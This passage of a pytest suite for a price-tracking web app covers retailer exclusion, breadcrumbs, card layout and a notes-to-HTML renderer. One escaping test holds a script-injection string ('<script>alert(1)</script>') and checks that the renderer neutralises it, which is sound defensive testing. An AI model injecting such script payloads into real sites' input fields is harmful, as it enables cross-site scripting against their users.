    crowdshop = next(x for x in product["listings"] if x["retailer_name"] == "Crowdshop")
    other = next(x for x in product["listings"] if x["retailer_name"] != "Crowdshop")

    client.patch(f"/api/retailer/{crowdshop['retailer_id']}", json={"excluded": True})

    fresh_other = client.get(f"/api/retailers/{other['id']}").json()
    assert fresh_other["active"] == 1


def test_unexcluding_a_retailer_does_not_reactivate_its_listings(client):
    """issue #112's open question, resolved "stay off": un-excluding is not a
    silent resume of watching - a listing switched off by exclusion stays off
    until someone reactivates it by hand."""
    product = q930h(client)
    listing = next(x for x in product["listings"] if x["retailer_name"] == "Crowdshop")
    retailer_id = listing["retailer_id"]

    client.patch(f"/api/retailer/{retailer_id}", json={"excluded": True})
    assert client.get(f"/api/retailers/{listing['id']}").json()["active"] == 0

    response = client.patch(f"/api/retailer/{retailer_id}", json={"excluded": False})
    assert response.json()["excluded"] is False
    assert client.get(f"/api/retailers/{listing['id']}").json()["active"] == 0


def test_patch_retailer_is_a_404_for_an_unknown_retailer(client):
    response = client.patch("/api/retailer/999999", json={"excluded": True})
    assert response.status_code == 404


def test_patch_retailer_requires_the_excluded_field(client):
    row = client.post("/api/retailers", json={"name": "Some Shop"}).json()
    response = client.patch(f"/api/retailer/{row['id']}", json={})
    assert response.status_code == 400


def test_excluded_retailer_blocks_adding_a_listing_manually(client):
    product = q930h(client)
    row = client.post("/api/retailers", json={"name": "Bing Lee"}).json()
    client.patch(f"/api/retailer/{row['id']}", json={"excluded": True})

    response = client.post(
        f"/api/products/{product['id']}/retailers",
        json={"retailer": "Bing Lee", "advertised_price": 100},
    )
    assert response.status_code == 400
    assert "excluded" in response.json()["detail"].lower()


def test_excluded_retailer_blocks_adding_a_listing_from_a_url(client):
    """Same refusal as the manual-add path, but through the retailer the URL's
    own domain resolves to (app/url_intake.py's display_name_for_domain), not a
    typed name - the two are different code paths into the same guard."""
    product = q930h(client)
    row = client.post("/api/retailers", json={"name": "Excludedshop"}).json()
    client.patch(f"/api/retailer/{row['id']}", json={"excluded": True})

    response = client.post(
        f"/api/products/{product['id']}/retailers/from-url",
        json={"url": "https://excludedshop.com.au/some-product"},
    )
    assert response.status_code == 400
    assert "excluded" in response.json()["detail"].lower()


def test_a_non_excluded_retailer_still_adds_a_listing_from_a_url(client):
    """The control for the two refusal tests above: an ordinary, non-excluded
    retailer must still work through both add paths."""
    product = q930h(client)
    response = client.post(
        f"/api/products/{product['id']}/retailers/from-url",
        json={"url": "https://freshshop.com.au/some-product"},
    )
    assert response.status_code == 201
    assert response.json()["listing"]["retailer_name"] == "Freshshop"


def test_retailers_page_lists_a_retailer_and_its_excluded_state(client):
    row = client.post("/api/retailers", json={"name": "Bing Lee"}).json()
    client.patch(f"/api/retailer/{row['id']}", json={"excluded": True})

    body = client.get("/retailers").text
    assert "Bing Lee" in body
    assert "excluded" in body.lower()


# --------------------------------------------------------------------------- breadcrumbs


def test_an_ungrouped_products_breadcrumb_has_no_group_crumb(client):
    product = q930h(client)
    body = client.get(f"/products/{product['id']}").text
    assert 'aria-label="Breadcrumb"' in body
    assert "Samsung Q-Series 9.1.4ch Soundbar" in body
    # Only "Home" before the current-page crumb - no group in between.
    assert body.count('<a href="/"') >= 1


def test_a_grouped_products_breadcrumb_names_its_group(client):
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    group = client.post(f"/api/products/{a['id']}/group", json={"name": "GPU search"}).json()

    body = client.get(f"/products/{a['id']}").text
    assert f'href="/groups/{group["group_id"]}"' in body
    assert "GPU search" in body


def test_the_group_pages_own_breadcrumb_names_the_group(client):
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    group = client.post(f"/api/products/{a['id']}/group", json={"name": "GPU search"}).json()

    body = client.get(f"/groups/{group['group_id']}").text
    assert 'aria-label="Breadcrumb"' in body
    assert '<span aria-current="page">GPU search</span>' in body


def test_the_retailers_pages_own_breadcrumb(client):
    body = client.get("/retailers").text
    assert 'aria-label="Breadcrumb"' in body
    assert '<span aria-current="page">Retailers</span>' in body


# -------------------------------------------------------------------- card-margin sweep


def test_a_groups_notes_are_indented_like_the_rest_of_the_card(client):
    """.muted is a bare colour utility with no spacing of its own, and
    <section class="product"> carries none either - found via a full sweep for this
    exact bug class (already hit twice elsewhere in this same card system): this
    paragraph rendered flush against the card's edge whenever a group had notes."""
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    group = client.post(
        f"/api/products/{a['id']}/group",
        json={"name": "GPU search", "notes": "Whichever hits $700 first."},
    ).json()

    body = client.get(f"/groups/{group['group_id']}").text
    assert 'style="margin:0 20px 12px"' in body
    assert "Whichever hits $700 first." in body


# -------------------------------------------------------------------------- notes_html


def test_notes_html_renders_two_or_more_bullet_lines_as_a_real_list():
    """deploy/research-runner.py's _format_reason writes "- " prefixed lines when the
    model returned reason_points - rendered here as a genuine <ul>, not the literal
    dashes (issue: "the notes should be split into dot points")."""
    from app.main import _notes_html

    text = "- First fact, from OzBargain\n- Second fact, checked through Aug 2026"
    html = str(_notes_html(text))
    assert html == (
        '<ul style="margin:0 0 6px;padding-left:20px">'
        "<li>First fact, from OzBargain</li>"
        "<li>Second fact, checked through Aug 2026</li>"
        "</ul>"
    )


def test_notes_html_preserves_order_of_mixed_bullet_and_plain_lines():
    """A non-bullet line (e.g. app.js's "Use this" meta line) can sit before or after
    a run of bullets - order must survive, not get regrouped by type."""
    from app.main import _notes_html

    text = "AI-estimated historical low, unconfirmed (medium confidence).\n- Point one\n- Point two"
    html = str(_notes_html(text))
    assert html.startswith('<p style="margin:0 0 6px">AI-estimated')
    assert html.index("<p") < html.index("<ul")
    assert html.index("Point one") < html.index("Point two")


def test_notes_html_renders_a_single_bullet_line_as_plain_text_not_a_one_item_list():
    """Fewer than 2 bullet lines is not really "bulleted content" - could be a stray
    hand-typed note starting with a dash. Falls back to a plain paragraph."""
    from app.main import _notes_html

    html = str(_notes_html("- just one line"))
    assert "<ul" not in html
    assert "- just one line" in html


def test_notes_html_renders_old_single_paragraph_notes_exactly_as_before():
    from app.main import _notes_html

    html = str(_notes_html("AI-estimated historical low, unconfirmed. Check before saving."))
    assert html == '<p style="margin:0">AI-estimated historical low, unconfirmed. Check before saving.</p>'


def test_notes_html_escapes_untrusted_content():
    """The source text can be LLM-relayed web content - never trust it as markup,
    the same discipline _safe_url already applies to url/homepage fields."""
    from app.main import _notes_html

    html = str(_notes_html("- <script>alert(1)</script>\n- second point"))
    assert "<script>" not in html
    assert "&lt;script&gt;" in html


def test_notes_html_handles_empty_input():
    from app.main import _notes_html

    assert str(_notes_html(None)) == ""
    assert str(_notes_html("")) == ""
    assert str(_notes_html("   \n  ")) == ""
